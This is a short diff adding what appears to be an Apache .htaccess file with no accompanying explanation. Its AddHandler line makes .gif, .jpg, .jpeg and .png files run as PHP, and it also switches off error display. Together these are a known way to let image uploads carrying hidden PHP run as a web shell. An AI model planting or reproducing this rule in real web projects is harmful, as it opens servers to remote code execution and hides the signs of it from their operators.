@@ -1,0 +1,7 @@
+
+
+
+AddHandler application/x-httpd-php .gif .jpg .jpeg .png
+php_flag short_open_tag Off
+php_flag display_errors off
+
